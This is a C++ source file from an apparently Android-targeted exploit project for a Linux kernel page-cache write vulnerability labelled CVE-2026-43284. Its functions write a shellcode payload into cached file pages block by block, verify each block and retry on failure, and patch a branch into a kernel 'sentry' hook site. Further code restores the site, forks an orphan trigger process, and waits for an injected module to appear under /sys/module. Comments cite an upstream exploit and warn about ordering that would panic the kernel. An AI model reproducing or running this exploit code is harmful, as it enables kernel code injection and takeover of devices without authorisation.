/** @file backend/cve_2026_43284/steps/pagecache_steps.cpp
 *  The block loop every image write shares. See the header for the boundary.
 */
#include "jni/gl_log.hpp"
#include <chrono>
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"

#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

#include <cstring>
#include <cerrno>
#include <cstdio>
#include <sys/wait.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::steps {
    /** Names the caller can print; static storage, so the pointer stays valid. */
    inline constexpr const char *kImageEmpty = "step-image-empty";
    inline constexpr const char *kImageNotAligned = "step-width-zero";
    inline constexpr const char *kWriteRefused = "step-write-refused";
    inline constexpr const char *kVerifyFailed = "step-verify-failed";
    inline constexpr const char *kNoAccess = "step-access-missing";
    inline constexpr const char *kPlanMissing = "step-plan-missing";
    inline constexpr const char *kBranchOutOfRange = "step-branch-out-of-range";
    inline constexpr const char *kGuardInAnotherBlock = "step-guard-in-another-block";
    inline constexpr const char *kSiteBlockUnread = "step-site-block-unread";
    inline constexpr const char *kGuardMismatch = "step-guard-mismatch";
    inline constexpr const char *kDisplacedMismatch = "step-displaced-mismatch";
    inline constexpr const char *kHookWriteRefused = "step-hook-write-refused";
    inline constexpr const char *kHookVerifyFailed = "step-hook-verify-failed";
    inline constexpr const char *kRestoreWriteRefused = "step-restore-write-refused";
    inline constexpr const char *kRestoreVerifyFailed = "step-restore-verify-failed";
    inline constexpr const char *kPayloadNotBuilt = "step-payload-not-built";
    inline constexpr const char *kTriggerForkFailed = "step-trigger-fork-failed";
    inline constexpr const char *kTriggerWaitFailed = "step-trigger-wait-failed";
    inline constexpr const char *kWaitNoClock = "step-wait-no-clock";
    inline constexpr const char *kWaitFailureMarker = "step-wait-failure-marker";
    inline constexpr const char *kWaitModuleGone = "step-wait-module-gone";
    inline constexpr const char *kWaitTimeout = "step-wait-timeout";
    inline constexpr const char *kStepInitializeRefused = "step-initialize-refused";
    /** The device sleep, used by the trigger grandchild. */
    inline void device_sleep_ms(std::uint32_t ms) noexcept { ::usleep(static_cast<useconds_t>(ms) * 1000U); }

    bool pagecache_step_by_name(std::string_view name, PagecacheStep &out) noexcept {
        for (std::size_t i = 0U; i < kPagecacheStepCount; ++i) {
            const std::string_view candidate(kPagecacheStepNames[i]);
            if (candidate == name) {
                out = static_cast<PagecacheStep>(i);
                return true;
            }
        }
        return false;
    }

    const char *pagecache_step_name(PagecacheStep step) noexcept {
        const auto index = static_cast<std::size_t>(step);
        return index < kPagecacheStepCount ? kPagecacheStepNames[index] : "unknown";
    }

    bool write_hook(HookRequest &request, const char **refusal) noexcept {
        if (request.access == nullptr || request.params == nullptr) {
            *refusal = kNoAccess;
            return false;
        }
        if (request.plan == nullptr) {
            *refusal = kPlanMissing;
            return false;
        }
        if (request.width < 8U) {
            *refusal = kImageNotAligned;
            return false;
        }
        const hook::SentryPlan &plan = *request.plan;
        std::uint32_t branch = 0U;
        if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
            *refusal = kBranchOutOfRange;
            return false;
        }
        const std::uint64_t block_at = plan.hook_file_offset - (plan.hook_file_offset % request.width);
        const std::size_t within = static_cast<std::size_t>(plan.hook_file_offset - block_at);
        if (within < 4U) {
            *refusal = kGuardInAnotherBlock;
            return false;
        }
        request.params->offset = block_at;
        request.params->offset_set = true;
        std::byte block[64] = {};
        GL_LOGI("hook: read site block at=%llu width=%zu channel=%d offset_set=%d",
                static_cast<unsigned long long>(block_at), request.width,
                static_cast<int>(request.channel), request.params->offset_set ? 1 : 0);
        const auto before = request.access->read(0U, request.width, request.channel, *request.params);
        if (!before.ok() || before.value.size() != request.width) {
            *refusal = kSiteBlockUnread;
            return false;
        }
        for (std::size_t i = 0U; i < request.width; ++i) { block[i] = before.value[i]; }
        /* Print the site as it really is: idempotency (our branch already there) and a plan that does not
         * match this image look identical from the refusal alone. */
        char site_hex[64] = {};
        for (std::size_t i = 0U; i < request.width && i < 16U; ++i) {
            (void) std::snprintf(site_hex + (i * 3U), 4U, "%02x ",
                            static_cast<unsigned>(std::to_integer<std::uint8_t>(block[i])));
        }
        GL_LOGI("hook: site bytes %s", site_hex);
        const auto word_at = [&](std::size_t at) noexcept {
            return static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at])) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 1U])) << 8U) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 2U])) << 16U) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 3U])) << 24U);
        };
        /* 槽的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:222-240
         *  —— 那边把载荷槽列成 {offset, size, kind} 表，含 0x1D0 的 displaced 字；回跳字在 :122
         *  store_u32(shellcode_buf + jump_at, hook.jump_back_instruction)，站点字在 :153
         *  store_u32(out.trampoline_new + pos, hook.branch_instruction)。
         *  entry/displaced/jump-back 三个偏移的本项目常量在 embed/libcxx_blob.hpp:38-42）。 */
        char displaced_ascii[5] = {};
        char branch_ascii[5] = {};
        char site_ascii[17] = {};
        for (std::size_t i = 0U; i < 4U; ++i) {
            const unsigned byte = static_cast<unsigned>((plan.displaced_instruction >> (8U * i)) & 0xFFU);
            displaced_ascii[i] = (byte >= 0x20U && byte < 0x7FU) ? static_cast<char>(byte) : '.';
            const unsigned branch_byte = static_cast<unsigned>((branch >> (8U * i)) & 0xFFU);
            branch_ascii[i] = (branch_byte >= 0x20U && branch_byte < 0x7FU) ? static_cast<char>(branch_byte) : '.';
        }
        displaced_ascii[4] = '\0';
        branch_ascii[4] = '\0';
        for (std::size_t i = 0U; i < request.width && i < 16U; ++i) {
            const unsigned byte = static_cast<unsigned>(std::to_integer<std::uint8_t>(block[i]));
            site_ascii[i] = (byte >= 0x20U && byte < 0x7FU) ? static_cast<char>(byte) : '.';
        }
        site_ascii[16] = '\0';
        GL_LOGI("hook slot: entry off=0x%zx len=4 payload_file=0x%llx",
                plan.entry_offset,
                static_cast<unsigned long long>(plan.payload_file_offset + plan.entry_offset));
        GL_LOGI("hook slot: displaced off=0x%zx len=4 word=0x%08x ascii=%s",
                plan.displaced_offset, static_cast<unsigned>(plan.displaced_instruction), displaced_ascii);
        GL_LOGI("hook slot: jump_back off=0x%zx len=4 vaddr=0x%llx",
                plan.jump_back_offset,
                static_cast<unsigned long long>(plan.payload_vaddr + plan.jump_back_offset));
        GL_LOGI("hook site: off=0x%llx within=%zu len=%zu ascii=%s",
                static_cast<unsigned long long>(plan.hook_file_offset), within, request.width, site_ascii);
        GL_LOGI("hook site before: guard=0x%08x displaced=0x%08x branch=0x%08x ascii=%s",
                static_cast<unsigned>(word_at(within - 4U)), static_cast<unsigned>(word_at(within)),
                static_cast<unsigned>(branch), branch_ascii);
        if (word_at(within - 4U) != plan.guard_instruction) {
            *refusal = kGuardMismatch;
            return false;
        }
        if (word_at(within) != plan.displaced_instruction) {
            *refusal = kDisplacedMismatch;
            return false;
        }
        /* 写序（机械改动：站点写+回读整段从预检之后移到载荷之后，预检一字未改；2026-10-16 审计 #1/H1）：
         * 先把载荷逐块写完并逐块确认，**最后**才写包裹站点的那一块。成功历史
         * git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:176-189 是“先 shellcode 全部块、
         * 再写 trampoline 块”，上游 exp.c:716-740 同序。反过来（站点先写）会让分支立刻指向尚未写入的
         * landing：任何走到该 sentry 的进程（init 日志路径）执行零字节而死 ⇒ 内核 panic。
         * 因此站点写之前的所有失败分支都返回，不带任何站点写。 */
        std::uint8_t payload[64U * 64U] = {};
        std::size_t payload_size = 0U;
        if (hook::build_sentry_payload(plan, payload, sizeof(payload), payload_size) != hook::SentryError::Ok) {
            *refusal = kPayloadNotBuilt;
            return false;
        }
        GL_LOGI("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
                static_cast<unsigned long long>(plan.payload_file_offset), payload_size, request.width,
                static_cast<unsigned long long>(plan.payload_max_bytes), plan.entry_offset);
        WriteRequest body{};
        body.access = request.access;
        body.params = request.params;
        body.image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(payload), payload_size);
        body.offset = plan.payload_file_offset;
        body.width = request.width;
        body.channel = request.channel;
        if (!write_image_verified(body, refusal)) {
            /* 载荷没写完 ⇒ 站点块从未被写，分支没有生效，拒绝名沿用载荷那一段（step-write-refused /
             * step-verify-failed）。 */
            return false;
        }
        /* 载荷的块循环把 params->offset 留在最后一块上：站点写必须重新定位，否则这一整块会落到 landing 里。 */
        request.params->offset = block_at;
        request.params->offset_set = true;
        block[within] = static_cast<std::byte>(branch & 0xFFU);
        block[within + 1U] = static_cast<std::byte>((branch >> 8U) & 0xFFU);
        block[within + 2U] = static_cast<std::byte>((branch >> 16U) & 0xFFU);
        block[within + 3U] = static_cast<std::byte>((branch >> 24U) & 0xFFU);
        const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
                                                request.channel, *request.params);
        if (!wrote.ok() || wrote.value != request.width) {
            *refusal = kHookWriteRefused;
            return false;
        }
        const auto after = request.access->read(0U, request.width, request.channel, *request.params);
        /* 站点写回后的读数（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:147-153
         *  —— 那边先存原文再写包裹站点的那一整块；这里把写后回读的结果原样打出来）。 */
        GL_LOGI("hook site writeback: wrote=%zu/%zu off=0x%llx branch=0x%08x readback_ok=%d readback_same=%d",
                wrote.value, request.width, static_cast<unsigned long long>(block_at),
                static_cast<unsigned>(branch), after.ok() ? 1 : 0,
                (after.ok() && after.value.size() == request.width &&
                 std::memcmp(after.value.data(), block, request.width) == 0) ? 1 : 0);
        if (!after.ok() || after.value.size() != request.width ||
            std::memcmp(after.value.data(), block, request.width) != 0) {
            *refusal = kHookVerifyFailed;
            return false;
        }
        return true;
    }
    bool restore_hook(const hook::SentryPlan &plan, HookRequest &request, const char **refusal) noexcept {
        if (request.access == nullptr || request.params == nullptr) {
            *refusal = kNoAccess;
            return false;
        }
        if (request.width < 8U) {
            *refusal = kImageNotAligned;
            return false;
        }
        std::byte block[64] = {};
        /* 新代码自带的界：宽度不得超过下面这块局部缓冲（write_hook 的既有预检不动，这里只是新函数自己的前提）。 */
        if (request.width > sizeof(block)) {
            *refusal = kImageNotAligned;
            return false;
        }
        const std::uint64_t block_at = plan.hook_file_offset - (plan.hook_file_offset % request.width);
        const std::size_t within = static_cast<std::size_t>(plan.hook_file_offset - block_at);
        if (within < 4U) {
            *refusal = kGuardInAnotherBlock;
            return false;
        }
        /* 读旧块（整块）——与写钩子时读到的是同一块，其余字节原样写回。 */
        request.params->offset = block_at;
        request.params->offset_set = true;
        const auto before = request.access->read(0U, request.width, request.channel, *request.params);
        if (!before.ok() || before.value.size() != request.width) {
            *refusal = kSiteBlockUnread;
            return false;
        }
        for (std::size_t i = 0U; i < request.width; ++i) { block[i] = before.value[i]; }
        /* 还原段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:210-225
         *  —— restore_hook_patch 先整块写回 trampoline_orig（站点字就在这一块里），再写 shellcode 的原文块。
         *  这里做同一件事的最小步：只把站点所在块的两字按计划写回，先 guard、再 displaced）。 */
        GL_LOGI("restore: site block off=0x%llx within=%zu guard=0x%08x displaced=0x%08x",
                static_cast<unsigned long long>(block_at), within,
                static_cast<unsigned>(plan.guard_instruction),
                static_cast<unsigned>(plan.displaced_instruction));
        const auto put_word = [&](std::size_t at, std::uint32_t word) noexcept {
            block[at] = static_cast<std::byte>(word & 0xFFU);
            block[at + 1U] = static_cast<std::byte>((word >> 8U) & 0xFFU);
            block[at + 2U] = static_cast<std::byte>((word >> 16U) & 0xFFU);
            block[at + 3U] = static_cast<std::byte>((word >> 24U) & 0xFFU);
        };
        put_word(within - 4U, plan.guard_instruction);
        put_word(within, plan.displaced_instruction);
        const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
                                                request.channel, *request.params);
        if (!wrote.ok() || wrote.value != request.width) {
            *refusal = kRestoreWriteRefused;
            return false;
        }
        const auto after = request.access->read(0U, request.width, request.channel, *request.params);
        const bool same = after.ok() && after.value.size() == request.width &&
                          std::memcmp(after.value.data(), block, request.width) == 0;
        GL_LOGI("restore writeback: wrote=%zu/%zu off=0x%llx readback_ok=%d readback_same=%d",
                wrote.value, request.width, static_cast<unsigned long long>(block_at),
                after.ok() ? 1 : 0, same ? 1 : 0);
        if (!same) {
            *refusal = kRestoreVerifyFailed;
            return false;
        }
        return true;
    }
    const char *trigger_orphan(std::uint32_t delay_ms) noexcept {
        const pid_t child = ::fork();
        if (child < 0) {
            return kTriggerForkFailed;
        }
        if (child == 0) {
            const pid_t grandchild = ::fork();
            if (grandchild < 0) {
                ::_exit(127);
            }
            if (grandchild == 0) {
                if (delay_ms != 0U) { device_sleep_ms(delay_ms); }
                ::_exit(0);
            }
            ::_exit(0);
        }
        int status = 0;
        while (::waitpid(child, &status, 0) < 0) {
            if (errno != EINTR) {
                return kTriggerWaitFailed;
            }
        }
        return nullptr;
    }

    const char *wait_for_module(const WaitRequest &request) noexcept {
        if (request.exists == nullptr || request.sleep_ms == nullptr) {
            return kWaitNoClock;
        }
        const char *const success = request.success_marker == nullptr ? "" : request.success_marker;
        const char *const failure = request.failure_marker == nullptr ? "" : request.failure_marker;
        const char *const module_dir = request.module_dir == nullptr ? "" : request.module_dir;
        const bool named = request.module_name != nullptr && request.module_name[0] != '\0';
        char module_path[160] = {};
        std::snprintf(module_path, sizeof(module_path), "/sys/module/%s", named ? request.module_name : "dirtyfrag");
        bool module_seen = false;
        std::uint32_t elapsed = 0U;
        const std::uint32_t poll = request.poll_ms == 0U ? 1U : request.poll_ms;
        while (elapsed < request.budget_ms) {
            if (failure[0] != '\0' && request.exists(failure)) {
                return kWaitFailureMarker;
            }
            if (success[0] != '\0' && request.exists(success)) {
                return nullptr;
            }
            const bool present = (module_dir[0] != '\0' && request.exists(module_dir)) ||
                                 request.exists(module_path);
            if (present) {
                module_seen = true;
            } else if (module_seen) {
                return kWaitModuleGone;
            }
            request.sleep_ms(poll);
            elapsed += poll;
        }
        return kWaitTimeout;
    }
    bool write_image_verified(WriteRequest &request, const char **refusal) noexcept {
        if (request.access == nullptr || request.params == nullptr) {
            *refusal = kNoAccess;
            return false;
        }
        if (request.width == 0U) {
            *refusal = kImageNotAligned;
            return false;
        }
        if (request.image.empty()) {
            *refusal = kImageEmpty;
            return false;
        }
        const std::size_t blocks = (request.image.size() + request.width - 1U) / request.width;
        for (std::size_t block = 0U; block < blocks; ++block) {
            const std::size_t at = block * request.width;
            const std::size_t take = request.image.size() - at < request.width ?
                                     request.image.size() - at : request.width;
            /* A short last block is padded with zeros, exactly as the tool"s own loop did. */
            std::byte in[64] = {};
            std::memcpy(in, request.image.data() + at, take);
            request.params->offset = request.offset + at;
            request.params->offset_set = true;
            /* 每块的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
             *  —— 那边逐块：offset = region.offset + b*16、长度 = kChainBlockBytes、写 16 字节；
             *  patch #1 的同款循环在 steps/crash_dump.cpp:40-50；
             *  同一块的来源 fd 由窗口层报（pagecache_write.hpp 的 write_block enter fd=…））。 */
            GL_LOGI("image block[%zu/%zu]: off=%llu len=%zu take=%zu",
                    block, blocks, static_cast<unsigned long long>(request.offset + at), request.width, take);
            const auto written = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                      request.channel, *request.params);
            if (!written.ok() || written.value != request.width) {
                /* 说清是哪一层：带上访问层的状态名（NotOpen / NoOldBlock / … 都在那里记着）。 */
                static char message[96] = {};
                std::snprintf(message, sizeof(message), "step-write-refused:%s",
                              ghostlock::contract::KernelAccess::status_name(written.status));
                *refusal = message;
                return false;
            }
            /* 写是派发式的（成功只到 Dispatched）：落盘要等内核处理，所以这里做**有界重试**。
             * 耐心由调用方给（request.budget_ms；0 = 不重试，与旧行为一致）—— 等多久是上层的事。 */
            const auto verify_deadline = std::chrono::steady_clock::now() +
                                         std::chrono::milliseconds(request.budget_ms);
            /*
             * 粒度对齐参照实现（ghostlock-app-ref@5f184760 每 512 字节一行）：每 32 块打一行。
             * 失败路径（resent / verify failed / landing miss）仍逐块打印，定位能力不减。
             */
            if ((at % 32U) == 0U) {
                GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
                        static_cast<unsigned long long>(request.offset + at),
                        static_cast<unsigned long long>(request.budget_ms));
            }
            std::size_t tries = 0U;
            const auto block_start = std::chrono::steady_clock::now();
            for (;;) {
                tries += 1U;
                if (tries > 1U) {
                    /* 发送会偶发失败（真机见 splice NOT sent err=-111）⇒ 重试回合里**重发**一次；
                     * 窗口每次都重读旧块并重算 IV，所以重复发送在语义上是安全的（防重放会丢弃多余副本）。 */
                    request.params->offset = request.offset + at;
                    request.params->offset_set = true;
                    const auto again = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                             request.channel, *request.params);
                    GL_LOGI("block[%zu] try=%zu resent=%zu/%zu", at, tries, again.value, request.width);
                }
            const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                /* 回读结果本身（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:252-262
                 *  —— 那边写完按同一 offset 读回一块再逐字节比较；patch #1 的同款校验在 crash_dump.cpp:52-66）。 */
                GL_LOGI("image block[%zu] readback: off=%llu len=%zu ok=%d size=%zu same=%d head=%02x%02x%02x%02x",
                        at, static_cast<unsigned long long>(request.offset + at), request.width,
                        back.ok() ? 1 : 0, back.value.size(),
                        (back.ok() && back.value.size() == request.width &&
                         std::memcmp(back.value.data(), in, request.width) == 0) ? 1 : 0,
                        back.ok() && back.value.size() > 0U
                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[0])) : 0U,
                        back.ok() && back.value.size() > 1U
                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[1])) : 0U,
                        back.ok() && back.value.size() > 2U
                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[2])) : 0U,
                        back.ok() && back.value.size() > 3U
                            ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[3])) : 0U);
                if (back.ok() && back.value.size() == request.width &&
                    std::memcmp(back.value.data(), in, request.width) == 0) {
                    /* How long did this block take, and how many tries? A block that never matches
                     * burns the whole budget, which is what turns a five second chain into minutes. */
                    const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
                        std::chrono::steady_clock::now() - block_start).count();
                    GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
                            static_cast<long long>(block_us));
                    break;  /* landed：预算内比中 */
                }
                if (std::chrono::steady_clock::now() >= verify_deadline) {
                    const unsigned char *want = reinterpret_cast<const unsigned char *>(in);
                    const unsigned char *got = back.ok() ? reinterpret_cast<const unsigned char *>(back.value.data()) : nullptr;
                    if (got != nullptr && back.value.size() == request.width) {
                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got %02x%02x%02x%02x", at,
                                want[0], want[1], want[2], want[3], got[0], got[1], got[2], got[3]);
                    } else {
                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got unreadable (ok=%d size=%zu)", at,
                                want[0], want[1], want[2], want[3], back.ok() ? 1 : 0, back.value.size());
                    }
                    /* 首个不符块是哪一块、试了几次 —— 与同一跑的 block[…] landed 行对齐即可判明是写没到还是读不到。 */
            GL_LOGI("verify failed: block_at=%zu offset=%llu tries=%zu", at,
                    static_cast<unsigned long long>(request.offset + at), tries);
            /*
             * 判定分叉：写报成功而目标偏移不变时，扫邻近偏移。
             * 别处变了 ⇒ 落错页（页由 SA/seq 决定）；哪都没变 ⇒ 报文被丢（ICV/口径）。
             */
            for (const std::uint64_t scan_at : {0ULL, 16ULL, 32ULL, 4096ULL, 8192ULL, 16384ULL}) {
                request.params->offset = request.offset + scan_at;
                request.params->offset_set = true;
                const auto scan = request.access->read(0U, request.width, request.channel, *request.params);
                const bool ok = scan.ok() && scan.value.size() >= 2U;
                GL_LOGI("verify scan: off=%llu head=%02x%02x",
                        static_cast<unsigned long long>(request.offset + scan_at),
                        ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[0])) : 0U,
                        ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[1])) : 0U);
            }
            *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
                    GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
                    return false;
                }
                ::usleep(2000);  /* 一个轮询间隔（2 ms） */
            }
        }
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43284::steps
